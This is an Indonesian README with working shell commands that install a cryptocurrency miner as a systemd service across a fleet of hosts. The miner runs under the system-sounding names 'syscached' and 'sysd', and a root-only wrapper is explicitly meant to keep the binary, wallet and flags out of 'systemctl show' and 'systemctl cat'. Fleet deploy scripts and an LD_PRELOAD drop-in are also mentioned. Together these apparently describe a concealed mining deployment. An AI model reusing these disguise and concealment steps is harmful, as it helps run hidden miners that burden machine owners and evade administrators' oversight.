# ops/systemd — unit contoh untuk miner CONN

Unit di folder ini adalah **template**, bukan konfigurasi fleet yang sedang
berjalan. Alamat pool, wallet, dan worker disimpan di environment file lokal.

## Pasang di satu host

```bash
sudo install -d -m 755 /etc/xcb /usr/local/sbin
sudo tee /usr/local/sbin/sysd >/dev/null <<'EOF'
#!/bin/sh
set -eu
: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
: "${THREADS:?THREADS kosong di /etc/xcb/miner.env}"
CONN_ADDRESS="$WALLET"
export CONN_ADDRESS
exec /usr/local/bin/xcb -a conn --worker "$WORKER" -t "$THREADS" --ui=log
EOF
sudo chmod 0700 /usr/local/sbin/sysd
sudo install -m 644 ops/systemd/syscached.service /etc/systemd/system/syscached.service
sudo install -m 600 ops/systemd/miner.env.example /etc/xcb/miner.env
sudoedit /etc/xcb/miner.env          # isi WALLET/WORKER/THREADS
sudo systemctl daemon-reload
sudo systemctl enable --now syscached
```

Cek:

```bash
systemctl status syscached
journalctl -u syscached -n 50 --no-pager
ldd /usr/local/bin/xcb | grep librandomx_v2
```

## Catatan

- **`WALLET` wajib diisi.** Placeholder `ISI_WALLET_CONN`/`CHANGE_ME` ditolak
  oleh `ExecStartPre`; service tidak akan start dengan alamat palsu.
- `EnvironmentFile=/etc/xcb/miner.env` wajib ada (tanpa prefix `-`), supaya
  kesalahan konfigurasi terlihat saat start, bukan diam-diam memakai default.
- `ExecStart` menunjuk ke wrapper `/usr/local/sbin/sysd` (0700 root), bukan
  binary langsung. Wrapper memvalidasi `WALLET`/`WORKER`/`THREADS` dari
  environment, menyalin `WALLET` ke `CONN_ADDRESS` (supaya binary lama yang
  hanya membaca `CONN_ADDRESS` tetap jalan setelah rollback), lalu `exec`
  `xcb`. Dengan begitu `systemctl show`/`systemctl cat` tidak memuat path
  binary, wallet, atau flag. `ops/fleet/install.sh` menulis wrapper ini.
- Wallet dan pool dibaca dari `WALLET`/`CONN_ADDRESS` dan `CONN_POOL` di
  `miner.env`; tidak ada lagi `-u` di `ExecStart`. `CONN_ADDRESS` menang atas
  `WALLET` di binary baru, jadi wrapper selalu menyamakan keduanya.
- `install.sh` membackup binary, library, dan unit lama dengan akhiran
  `-<stamp>`; rollback harus mengembalikan ketiganya, karena unit baru tidak
  kompatibel dengan binary pra-PR #20 (yang mengabaikan `WALLET` di jalur CONN
  dan tidak memecah `host:port` dari `CONN_POOL`).
- Nama unit `syscached` dipertahankan karena `ops/fleet/deploy.sh` dan
  `apply.sh` memakai `SVC=syscached` secara default.
- Binary dan `librandomx_v2.so` harus berada di direktori yang sama
  (`/usr/local/bin/`) karena RPATH `$ORIGIN`.
- Unit tidak mengatur hugepages. Jalankan `./mine.sh --persist` sekali atau
  tulis `vm.nr_hugepages` di `/etc/sysctl.d/`.
- `ops/fleet` hanya mengganti binary + library; unit dan environment file
  dikelola terpisah agar wallet tidak ikut tersebar di repo.
- `ops/instabox` memakai unit dasar yang sama, ditambah drop-in
  `syscached.service.d/10-instabox.conf` untuk `LD_PRELOAD` dan hugepages.
  Jangan menjalankan kedua deploy di host yang sama; hapus drop-in instabox
  sebelum memakai `ops/fleet`.
